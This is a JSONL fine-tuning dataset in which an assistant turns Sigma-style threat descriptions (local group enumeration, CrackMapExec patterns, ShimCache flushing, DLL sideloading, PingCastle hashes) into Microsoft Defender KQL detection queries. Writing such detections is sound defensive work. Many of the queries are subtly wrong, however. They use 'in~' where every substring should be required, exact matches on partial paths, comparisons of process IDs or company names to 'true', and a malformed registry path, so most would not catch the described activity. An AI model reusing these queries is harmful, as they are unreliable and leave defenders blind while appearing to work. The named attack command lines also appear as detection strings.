{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects enumeration of local system groups. Adversaries may attempt to find local system groups and permission settings Topic: proc_creation_lnx_local_groups"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/groups\" or (ProcessCommandLine =~ \"/etc/group\" and (InitiatingProcessFolderPath in~ (\"/cat\", \"/head\", \"/tail\", \"/more\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"odbcconf\" with \"INSTALLDRIVER\" which installs a new ODBC driver. Attackers abuse this to install and run malicious DLLs. Topic: proc_creation_win_odbcconf_driver_install"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"INSTALLDRIVER \", \".dll\")) and (FolderPath endswith \"\\\\odbcconf.exe\" or ProcessVersionInfoOriginalFileName =~ \"odbcconf.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential CommandLine obfuscation using unicode characters.\nAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.\n Topic: proc_creation_win_susp_cli_obfuscation_unicode"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\u02e3\", \"\u02ea\", \"\u02e2\", \"\u2215\", \"\u2044\", \"\u2015\", \"\u2014\", \"\u00a0\", \"\u00af\", \"\u00ae\", \"\u00b6\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity Topic: proc_creation_win_pua_nircmd"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" execmd \", \".exe script \", \".exe shexec \", \" runinteractive \")) or (FolderPath endswith \"\\\\NirCmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"NirCmd.exe\")) or ((ProcessCommandLine in~ (\" exec \", \" exec2 \")) and (ProcessCommandLine in~ (\" show \", \" hide \")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of system utilities to discover system network connections Topic: proc_creation_macos_system_network_connections_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"/who\", \"/w\", \"/last\", \"/lsof\", \"/netstat\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of winget to add a new insecure (http) download source.\nWinget will not allow the addition of insecure sources, hence this could indicate potential suspicious activity (or typos)\n Topic: proc_creation_win_winget_add_insecure_custom_source"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"source \", \"add \", \"http://\")) and (FolderPath endswith \"\\\\winget.exe\" or ProcessVersionInfoOriginalFileName =~ \"winget.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a possible remote connections to Silenttrinity c2 Topic: net_connection_win_silenttrinity_stager_msbuild_activity"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessFolderPath =~ \"\\\\msbuild.exe\" and (InitiatingProcessId =~ \"true\" and (RemotePort in~ (\"80\", \"443\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect use of X509Enrollment Topic: proc_creation_win_powershell_x509enrollment"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"X509Enrollment.CBinaryConverter\", \"884e2002-217d-11da-b2a4-000e7bbb2b09\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of file with specific names used by RemoteKrbRelay SMB Relay attack module. Topic: file_event_win_hktl_krbrelay_remote_ioc"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\":\\\\windows\\\\temp\\\\sam.tmp\", \":\\\\windows\\\\temp\\\\sec.tmp\", \":\\\\windows\\\\temp\\\\sys.tmp\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects attempts to create and add an account to the admin group via \"dscl\" Topic: proc_creation_macos_dscl_add_user_to_admin_group"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -append \", \" /Groups/admin \", \" GroupMembership \")) and InitiatingProcessFolderPath =~ \"/dscl\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential abuse of the \"register_app.vbs\" script that is part of the Windows SDK. The script offers the capability to register new VSS/VDS Provider as a COM+ application. Attackers can use this to install malicious DLLs for persistence and execution. Topic: proc_creation_win_lolscript_register_app"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \".vbs -register \" and ((FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"cscript.exe\", \"wscript.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DLL sideloading of VMGuestLib.dll by the WmiApSrv service. Topic: image_load_side_load_vmguestlib"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where ((FolderPath contains \"\\\\VMware\\\\VMware Tools\\\\vmStatsProvider\\\\win32\" and FolderPath contains \"\\\\vmGuestLib.dll\") and InitiatingProcessFolderPath =~ \"\\\\Windows\\\\System32\\\\wbem\\\\WmiApSrv.exe\") and (not(InitiatingProcessVersionInfoCompanyName =~ \"true\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects child processes of Microsoft.NodejsTools.PressAnyKey.exe that can be used to execute any other binary Topic: proc_creation_win_pressanykey_lolbin_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\Microsoft.NodejsTools.PressAnyKey.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of rundll32 that leads to the invocation of legitimate Windows binaries.\nThe malware Pikabot has been seen to use this technique for process hollowing through hard-coded Windows binaries\n Topic: proc_creation_win_malware_pikabot_rundll32_hollowing"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName =~ \"\\\\rundll32.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\SearchFilterHost.exe\", \"\\\\SearchProtocolHost.exe\", \"\\\\sndvol.exe\", \"\\\\wermgr.exe\", \"\\\\wwahost.exe\"))) and (not((InitiatingProcessCommandLine =~ \"mmsys.cpl\" and InitiatingProcessFolderPath =~ \"\\\\sndvol.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of REGSVR32.exe with DLL files masquerading as other files Topic: proc_creation_win_regsvr32_susp_extensions"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\regsvr32.exe\" or ProcessVersionInfoOriginalFileName =~ \"REGSVR32.EXE\") and (ProcessCommandLine endswith \".bin\" or ProcessCommandLine endswith \".bmp\" or ProcessCommandLine endswith \".cr2\" or ProcessCommandLine endswith \".dat\" or ProcessCommandLine endswith \".eps\" or ProcessCommandLine endswith \".gif\" or ProcessCommandLine endswith \".ico\" or ProcessCommandLine endswith \".jpeg\" or ProcessCommandLine endswith \".jpg\" or ProcessCommandLine endswith \".nef\" or ProcessCommandLine endswith \".orf\" or ProcessCommandLine endswith \".png\" or ProcessCommandLine endswith \".raw\" or ProcessCommandLine endswith \".sr2\" or ProcessCommandLine endswith \".temp\" or ProcessCommandLine endswith \".tif\" or ProcessCommandLine endswith \".tiff\" or ProcessCommandLine endswith \".tmp\" or ProcessCommandLine endswith \".rtf\" or ProcessCommandLine endswith \".txt\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects WMIC executions in which an event consumer gets created. This could be used to establish persistence Topic: proc_creation_win_wmic_eventconsumer_creation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"ActiveScriptEventConsumer\", \" CREATE \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon and potentially suspicious one-liner command containing both \"ping\" and \"copy\" at the same time, which is usually used by malware.\n Topic: proc_creation_win_cmd_ping_copy_combined_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"ping\", \"copy \")) and (ProcessCommandLine contains \" -n \" or ProcessCommandLine contains \" /n \" or ProcessCommandLine contains \" \u2013n \" or ProcessCommandLine contains \" \u2014n \" or ProcessCommandLine contains \" \u2015n \") and (ProcessCommandLine contains \" -y \" or ProcessCommandLine contains \" /y \" or ProcessCommandLine contains \" \u2013y \" or ProcessCommandLine contains \" \u2014y \" or ProcessCommandLine contains \" \u2015y \") and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of DLLs that are part of antivirus software suchas McAfee, Symantec...etc Topic: image_load_side_load_antivirus"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\log.dll\" and (not(((FolderPath startswith \"C:\\\\Program Files\\\\Bitdefender Antivirus Free\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\Bitdefender Antivirus Free\\\\\") or (InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\Dell\\\\SARemediation\\\\audit\\\\TelemetryUtility.exe\" and (FolderPath in~ (\"C:\\\\Program Files\\\\Dell\\\\SARemediation\\\\plugin\\\\log.dll\", \"C:\\\\Program Files\\\\Dell\\\\SARemediation\\\\audit\\\\log.dll\"))) or FolderPath startswith \"C:\\\\Program Files\\\\Canon\\\\MyPrinter\\\\\")))) or (FolderPath endswith \"\\\\qrt.dll\" and (not((FolderPath startswith \"C:\\\\Program Files\\\\F-Secure\\\\Anti-Virus\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\F-Secure\\\\Anti-Virus\\\\\")))) or ((FolderPath endswith \"\\\\ashldres.dll\" or FolderPath endswith \"\\\\lockdown.dll\" or FolderPath endswith \"\\\\vsodscpl.dll\") and (not((FolderPath startswith \"C:\\\\Program Files\\\\McAfee\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\McAfee\\\\\")))) or (FolderPath endswith \"\\\\vftrace.dll\" and (not((FolderPath startswith \"C:\\\\Program Files\\\\CyberArk\\\\Endpoint Privilege Manager\\\\Agent\\\\x32\\\\\" or FolderPath startswith \"C:\\\\Program Files (x86)\\\\CyberArk\\\\Endpoint Privilege Manager\\\\Agent\\\\x32\\\\\")))) or (FolderPath endswith \"\\\\wsc.dll\" and (not((FolderPath startswith \"C:\\\\program Files\\\\AVAST Software\\\\Avast\\\\\" or FolderPath startswith \"C:\\\\program Files (x86)\\\\AVAST Software\\\\Avast\\\\\")))) or (FolderPath endswith \"\\\\tmdbglog.dll\" and (not((FolderPath startswith \"C:\\\\program Files\\\\Trend Micro\\\\Titanium\\\\\" or FolderPath startswith \"C:\\\\program Files (x86)\\\\Trend Micro\\\\Titanium\\\\\")))) or (FolderPath endswith \"\\\\DLPPREM32.dll\" and (not((FolderPath startswith \"C:\\\\program Files\\\\ESET\" or FolderPath startswith \"C:\\\\program Files (x86)\\\\ESET\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when DllRegisterServer is called in the commandline and the image is not rundll32. This could mean that the rundll32 utility has been renamed in order to avoid detection Topic: proc_creation_win_renamed_rundll32_dllregisterserver"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"DllRegisterServer\" and (not(InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect change of the user account associated with the FAX service to avoid the escalation problem. Topic: registry_set_fax_change_service_user"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey =~ \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet001\\\\Services\\\\Fax\\\\ObjectName\" and (not(RegistryValueData contains \"NetworkService\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects actions that clear the local ShimCache and remove forensic evidence Topic: proc_creation_win_rundll32_susp_shimcache_flush"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"rundll32\", \"apphelp.dll\")) and (ProcessCommandLine in~ (\"ShimFlushCache\", \"#250\"))) or ((ProcessCommandLine in~ (\"rundll32\", \"kernel32.dll\")) and (ProcessCommandLine in~ (\"BaseFlushAppcompatCache\", \"#46\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may abuse msiexec.exe to proxy the execution of malicious payloads Topic: proc_creation_win_msiexec_embedding"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessCommandLine in~ (\"MsiExec.exe\", \"-Embedding \")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\cmd.exe\"))) and (not(((ProcessCommandLine =~ \"C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\\" and InitiatingProcessFolderPath =~ \":\\\\Windows\\\\System32\\\\cmd.exe\") or (ProcessCommandLine contains \"\\\\DismFoDInstall.cmd\" or (InitiatingProcessCommandLine contains \"\\\\MsiExec.exe -Embedding \" and InitiatingProcessCommandLine contains \"Global\\\\MSI0000\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects various execution patterns of the CrackMapExec pentesting framework Topic: proc_creation_win_hktl_crackmapexec_execution_patterns"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"powershell.exe -exec bypass -noni -nop -w 1 -C \\\"\", \"powershell.exe -noni -nop -w 1 -enc \") or (ProcessCommandLine contains \"cmd.exe /Q /c \" and ProcessCommandLine contains \" 1> \\\\\" and ProcessCommandLine contains \"\\\\\" and ProcessCommandLine contains \"\\\\\" and ProcessCommandLine contains \" 2>&1\") or (ProcessCommandLine contains \"cmd.exe /C \" and ProcessCommandLine contains \" > \\\\\" and ProcessCommandLine contains \"\\\\\" and ProcessCommandLine contains \"\\\\\" and ProcessCommandLine contains \" 2>&1\") or (ProcessCommandLine contains \"cmd.exe /C \" and ProcessCommandLine contains \" > \" and ProcessCommandLine contains \"\\\\Temp\\\\\" and ProcessCommandLine contains \" 2>&1\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential sideloading of malicious \"aclui.dll\" by OleView.This behavior was observed in Raspberry-Robin variants reported by chekpoint research on Feburary 2024.\n Topic: image_load_malware_raspberry_robin_side_load_aclui_oleview"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\aclui.dll\" and InitiatingProcessFolderPath =~ \"\\\\OleView.exe\") and (not((InitiatingProcessVersionInfoCompanyName =~ \"true\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Windows Kits\\\\\", \"C:\\\\Program Files\\\\Microsoft SDKs\\\\\"))))) and (not(InitiatingProcessFolderPath contains \"\\\\Windows Resource Kit\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of PingCastle, a tool designed to quickly assess the Active Directory security level. Topic: proc_creation_win_pua_pingcastle"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((MD5 startswith \"f741f25ac909ee434e50812d436c73ff\" or MD5 startswith \"d40acbfc29ee24388262e3d8be16f622\" or MD5 startswith \"01bb2c16fadb992fa66228cd02d45c60\" or MD5 startswith \"9e1b18e62e42b5444fc55b51e640355b\" or MD5 startswith \"b7f8fe33ac471b074ca9e630ba0c7e79\" or MD5 startswith \"324579d717c9b9b8e71d0269d13f811f\" or MD5 startswith \"63257a1ddaf83cfa43fe24a3bc06c207\" or MD5 startswith \"049e85963826b059c9bac273bb9c82ab\" or MD5 startswith \"ecb98b7b4d4427eb8221381154ff4cb2\" or MD5 startswith \"faf87749ac790ec3a10dd069d10f9d63\" or MD5 startswith \"f296dba5d21ad18e6990b1992aea8f83\" or MD5 startswith \"93ba94355e794b6c6f98204cf39f7a11\" or MD5 startswith \"a258ef593ac63155523a461ecc73bdba\" or MD5 startswith \"97000eb5d1653f1140ee3f47186463c4\" or MD5 startswith \"95eb317fbbe14a82bd9fdf31c48b8d93\" or MD5 startswith \"32fe9f0d2630ac40ea29023920f20f49\" or MD5 startswith \"a05930dde939cfd02677fc18bb2b7df5\" or MD5 startswith \"124283924e86933ff9054a549d3a268b\" or MD5 startswith \"ceda6909b8573fdeb0351c6920225686\" or MD5 startswith \"60ce120040f2cd311c810ae6f6bbc182\" or MD5 startswith \"2f10cdc5b09100a260703a28eadd0ceb\" or MD5 startswith \"011d967028e797a4c16d547f7ba1463f\" or MD5 startswith \"2da9152c0970500c697c1c9b4a9e0360\" or MD5 startswith \"b5ba72034b8f44d431f55275bace9f8b\" or MD5 startswith \"d6ed9101df0f24e27ff92ddab42dacca\" or MD5 startswith \"3ed3cdb6d12aa1ac562ad185cdbf2d1d\" or MD5 startswith \"5e083cd0143ae95a6cb79b68c07ca573\" or MD5 startswith \"28caff93748cb84be70486e79f04c2df\" or MD5 startswith \"9d4f12c30f9b500f896efd1800e4dd11\" or MD5 startswith \"4586f7dd14271ad65a5fb696b393f4c0\" or MD5 startswith \"86ba9dddbdf49215145b5bcd081d4011\" or MD5 startswith \"9dce0a481343874ef9a36c9a825ef991\" or MD5 startswith \"85890f62e231ad964b1fda7a674747ec\" or MD5 startswith \"599be548da6441d7fe3e9a1bb8cb0833\" or MD5 startswith \"9b0c7fd5763f66e9b8c7b457fce53f96\" or MD5 startswith \"32d45718164205aec3e98e0223717d1d\" or MD5 startswith \"6ff5f373ee7f794cd17db50704d00ddb\" or MD5 startswith \"88efbdf41f0650f8f58a3053b0ca0459\" or MD5 startswith \"ef915f61f861d1fb7cbde9afd2e7bd93\" or MD5 startswith \"781fa16511a595757154b4304d2dd350\" or MD5 startswith \"5018ec39be0e296f4fc8c8575bfa8486\" or MD5 startswith \"f4a84d6f1caf0875b50135423d04139f\") or (SHA1 startswith \"9c1431801fa6342ed68f047842b9a11778fc669b\" or SHA1 startswith \"c36c862f40dad78cb065197aad15fef690c262f2\" or SHA1 startswith \"bc8e23faea8b3c537f268b3e81d05b937012272d\" or SHA1 startswith \"12e0357658614ff60d480d1a6709be68a2e40c5f\" or SHA1 startswith \"18b33ab5719966393d424a3edbfa8dec225d98fa\" or SHA1 startswith \"f14c9633040897d375e3069fddc71e859f283778\" or SHA1 startswith \"08041b426c9f112ad2061bf3c8c718e34739d4fc\" or SHA1 startswith \"7be77c885d0c9a4af4cecc64d512987cf93ba937\" or SHA1 startswith \"72dbb719b05f89d9d2dbdf186714caf7639daa36\" or SHA1 startswith \"5b1498beb2cfb4d971e377801e7abce62c0e315b\" or SHA1 startswith \"292629c6ab33bddf123d26328025e2d157d9e8fc\" or SHA1 startswith \"be59e621e83a2d4c87b0e6c69a2d22f175408b11\" or SHA1 startswith \"0250ce9a716ab8cca1c70a9de4cbc49a51934995\" or SHA1 startswith \"607e1fa810c799735221a609af3bfc405728c02d\" or SHA1 startswith \"ab1c547f6d1c07a9e0a01e46adea3aae1cac12e3\" or SHA1 startswith \"044cf5698a8e6b0aeba5acb56567f06366a9a70a\" or SHA1 startswith \"ef2dea8c736d49607832986c6c2d6fdd68ba6491\" or SHA1 startswith \"efffc2bfb8af2e3242233db9a7109b903fc3f178\" or SHA1 startswith \"5a05d4320de9afbc84de8469dd02b3a109efb2d4\" or SHA1 startswith \"a785d88cf8b862a420b9be793ee6a9616aa94c84\" or SHA1 startswith \"5688d56cbaf0d934c4e37b112ba257e8fb63f4ea\" or SHA1 startswith \"5cd2ada1c26815fbfd6a0cd746d5d429c0d83a17\" or SHA1 startswith \"81d67b3d70c4e855cb11a453cc32997517708362\" or SHA1 startswith \"9cffce9de95e0109f4dfecce0ab2cb0a59cc58ad\" or SHA1 startswith \"09c6930d057f49c1c1e11cf9241fffc8c12df3a2\" or SHA1 startswith \"e27bf7db8d96db9d4c8a06ee5e9b8e9fcb86ac92\" or SHA1 startswith \"9e3c992415e390f9ada4d15c693b687f38a492d1\" or SHA1 startswith \"3f34a5ee303d37916584c888c4928e1c1164f92a\" or SHA1 startswith \"ea4c8c56a8f5c90a4c08366933e5fb2de611d0db\" or SHA1 startswith \"3150f14508ee4cae19cf09083499d1cda8426540\" or SHA1 startswith \"036ad9876fa552b1298c040e233d620ea44689c6\" or SHA1 startswith \"3a3c1dcb146bb4616904157344ce1a82cd173bf5\" or SHA1 startswith \"6230d6fca973fa26188dfbadede57afb4c15f75c\" or SHA1 startswith \"8f7b2a9b8842f339b1e33602b7f926ab65de1a4d\" or SHA1 startswith \"a586bb06b59a4736a47abff8423a54fe8e2c05c4\" or SHA1 startswith \"c82152cddf9e5df49094686531872ecd545976db\" or SHA1 startswith \"04c39ffc18533100aaa4f9c06baf2c719ac94a61\" or SHA1 startswith \"e082affa5cdb2d46452c6601a9e85acb8446b836\" or SHA1 startswith \"a075bfb6cf5c6451ce682197a87277c8bc188719\" or SHA1 startswith \"34c0c5839af1c92bce7562b91418443a2044c90d\" or SHA1 startswith \"74e10a9989e0ec8fe075537ac802bd3031ae7e08\" or SHA1 startswith \"3a515551814775df0ccbe09f219bc972eae45a10\") or (SHA256 startswith \"90fd5b855b5107e7abaaefb6e658f50d5d6e08ac28e35f31d8b03dcabf77872b\" or SHA256 startswith \"5836c24f233f77342fee825f3cad73caab7ab4fb65ec2aec309fd12bc1317e85\" or SHA256 startswith \"e850e54b12331249c357a20604281b9abf8a91e6f3d957463fc625e6b126ef03\" or SHA256 startswith \"9e752f29edcd0db9931c20b173eee8d4d8196f87382c68a6e7eb4c8a44d58795\" or SHA256 startswith \"7a8c127d6c41f80d178d2315ed2f751ac91b1cd54d008af13680e04f068f426f\" or SHA256 startswith \"9f65e1c142c4f814e056a197a2241fd09e09acf245c62897109871137321a72a\" or SHA256 startswith \"c9b52d03c66d54d6391c643b3559184b1425c84a372081ec2bfed07ebf6af275\" or SHA256 startswith \"1b96f6218498aa6baf6f6c15b8f99e542077e33feb1ab5472bbbf7d4de43eb6b\" or SHA256 startswith \"768021fc242054decc280675750dec0a9e74e764b8646864c58756fa2386d2a2\" or SHA256 startswith \"1e1b32bef31be040f0f038fcb5a2d68fb192daaef23c6167f91793d21e06ebae\" or SHA256 startswith \"606bd75ed9d2d6107ea7ee67063d1761a99f2fb5e932c8344d11395d24587dd6\" or SHA256 startswith \"b489d3cdd158f040322ae5c8d0139ad28eff743c738a10f2d0255c7e149bd92a\" or SHA256 startswith \"ca7ecf04a8ad63aff330492c15270d56760cb223a607cdb1431fb00e1b9985d1\" or SHA256 startswith \"9dc4fca72463078b70f6516559a179c78400b06534e63ee12fb38adbe2632559\" or SHA256 startswith \"c00d2aee59bac087d769e09b5b7f832176f7714fefdc6af2502e6031e3eb37c2\" or SHA256 startswith \"a8e96d564687064190eaf865774f773def05fdbf651aa5bbf66216c077b863ef\" or SHA256 startswith \"84ed328cee2a0505e87662faf6fc57915e3a831c97ee88ad691f5c63522e139d\" or SHA256 startswith \"c143de99c57965d3a44c1fce6a97c2773b050609c1ea7f45688a4ca2422a5524\" or SHA256 startswith \"01d1efd5e552c59baa70c0778902233c05fde7de6e5cc156c62607df0804d36b\" or SHA256 startswith \"9a8dfeb7e3174f3510691e2b32d0f9088e0ed67d9ed1b2afbe450d70dec2016b\" or SHA256 startswith \"63b92a114075d855f706979d50ed3460fe39f8a2f5498b7657f0d14865117629\" or SHA256 startswith \"2eb014130ff837b6481c26f0d0152f84de22ca7370b15a4f51921e0054a2a358\" or SHA256 startswith \"7d5bb4271bf8ca2b63a59e731f3ec831dbda53adb8e28665e956afb4941f32ca\" or SHA256 startswith \"e57098a75bf32e127c214b61bfba492d6b209e211f065fcc84ff10637a2143ea\" or SHA256 startswith \"dd14dbcdbcfcf4bc108a926b9667af4944a3b6faf808cf1bb9a3a2554722e172\" or SHA256 startswith \"dca2b1b824cb28bd15577eace45bde7ff8f8f44705b17085524659de31761de4\" or SHA256 startswith \"8b95f339a07d59a8c8d8580283dffb9e8dfabdeb9171e42c948ab68c71afe7f2\" or SHA256 startswith \"5428a840fab6ac4a0ecb2fc20dbc5f928432b00b9297dd1cb6e69336f44eba66\" or SHA256 startswith \"e2517ae0fccaa4aefe039026a4fc855964f0c2a5f84177140200b0e58ddbfd27\" or SHA256 startswith \"75d05880de2593480254181215dd9a0075373876f2f4a2a4a9a654b2e0729a41\" or SHA256 startswith \"56490e14ce3817c3a1ddc0d97b96e90d6351bcd29914e7c9282f6a998cca84b1\" or SHA256 startswith \"f25d0a5e77e4ed9e7c4204a33cfc8e46281b43adbee550b15701dd00f41bdbe0\" or SHA256 startswith \"845a5fdcbb08e7efa7e0eabfcd881c9eebc0eec0a3a2f8689194e6b91b6eeaf8\" or SHA256 startswith \"9a89e6652e563d26a3f328ba23d91f464c9549da734557c5a02559df24b2700d\" or SHA256 startswith \"5614f2bc9b2ed414aab2c5c7997bdcbe8236e67ced8f91a63d1b6cfbe6e08726\" or SHA256 startswith \"37bf92dcedb47a90d8d38ebda8d8dd168ef5803dcb01161f8cf6d68b70d49d90\" or SHA256 startswith \"ec8590f91f5cc21e931c57345425f0625a6e37dfba026b222260450de40459f5\" or SHA256 startswith \"3994eb72b1c227c593e14b8cad7001de11d1c247d4fbf84d0714bb8a17853140\" or SHA256 startswith \"d654f870436d63c9d8e4390d9d4d898abdf0456736c7654d71cdf81a299c3f87\" or SHA256 startswith \"63fbfabd4d8afb497dee47d112eb9d683671b75a8bf6407c4bd5027fd211b892\" or SHA256 startswith \"47028053f05188e6a366fff19bedbcad2bc4daba8ff9e4df724b77d0181b7054\" or SHA256 startswith \"7c1b1e8c880a30c43b3a52ee245f963a977e1f40284f4b83f4b9afe3821753dd\")) or FolderPath endswith \"\\\\PingCastle.exe\" or ProcessVersionInfoOriginalFileName =~ \"PingCastle.exe\" or ProcessVersionInfoProductName =~ \"Ping Castle\" or (ProcessCommandLine contains \"--scanner aclcheck\" or ProcessCommandLine contains \"--scanner antivirus\" or ProcessCommandLine contains \"--scanner computerversion\" or ProcessCommandLine contains \"--scanner foreignusers\" or ProcessCommandLine contains \"--scanner laps_bitlocker\" or ProcessCommandLine contains \"--scanner localadmin\" or ProcessCommandLine contains \"--scanner nullsession\" or ProcessCommandLine contains \"--scanner nullsession-trust\" or ProcessCommandLine contains \"--scanner oxidbindings\" or ProcessCommandLine contains \"--scanner remote\" or ProcessCommandLine contains \"--scanner share\" or ProcessCommandLine contains \"--scanner smb\" or ProcessCommandLine contains \"--scanner smb3querynetwork\" or ProcessCommandLine contains \"--scanner spooler\" or ProcessCommandLine contains \"--scanner startup\" or ProcessCommandLine contains \"--scanner zerologon\") or ProcessCommandLine contains \"--no-enum-limit\" or (ProcessCommandLine contains \"--healthcheck\" and ProcessCommandLine contains \"--level Full\") or (ProcessCommandLine contains \"--healthcheck\" and ProcessCommandLine contains \"--server \")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file association changes using the builtin \"assoc\" command.\nWhen a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n Topic: proc_creation_win_cmd_assoc_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"assoc\" and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")"}]}
